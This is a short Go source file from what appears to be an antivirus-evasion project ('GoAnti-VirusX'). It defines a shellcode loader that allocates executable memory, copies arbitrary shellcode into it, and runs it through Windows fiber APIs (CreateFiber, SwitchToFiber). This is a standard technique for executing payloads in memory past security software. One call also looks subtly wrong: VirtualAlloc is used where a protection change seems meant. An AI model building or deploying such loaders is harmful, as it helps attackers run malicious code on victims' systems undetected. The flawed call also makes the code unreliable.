package Loader

import (
	"GoAnti-VirusX/API"
	"golang.org/x/sys/windows"
	"unsafe"
)

func FiberLoader(shellcode []byte) {
	api, _ := API.SetWindowsAPI()
	fiberAddr, _, _ := api.ConvertThreadToFiber().Call()

	addr, _, err := api.VirtualAlloc().Call(0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_EXECUTE_READWRITE)

	if addr == 0 {
		panic(err)
	}

	_, _, _ = api.RtlCopyMemory().Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	oldProtect := windows.PAGE_EXECUTE_READWRITE
	_, _, _ = api.VirtualAlloc().Call(addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	fiber, _, _ := api.CreateFiber().Call(0, addr, 0)

	_, _, _ = api.SwitchToFiber().Call(fiber)
	_, _, _ = api.SwitchToFiber().Call(fiberAddr)
}
